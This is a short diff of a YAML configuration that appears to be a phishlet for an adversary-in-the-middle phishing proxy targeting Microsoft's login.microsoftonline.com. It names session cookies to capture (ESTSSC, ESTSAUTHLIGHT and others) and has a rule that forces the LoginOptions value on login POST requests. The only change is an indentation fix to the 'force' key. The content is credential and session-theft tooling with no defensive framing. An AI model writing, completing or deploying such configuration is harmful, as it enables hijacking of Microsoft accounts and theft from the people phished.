@@ -155,7 +155,7 @@ auth_tokens:
   - domain: 'login.microsoftonline.com'
     keys: ['ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
     type: 'cookie'
-force:
+    force:
   - path: "/ppsecure/post*"
     search:
       - { key: "LoginOptions", search: "1" }
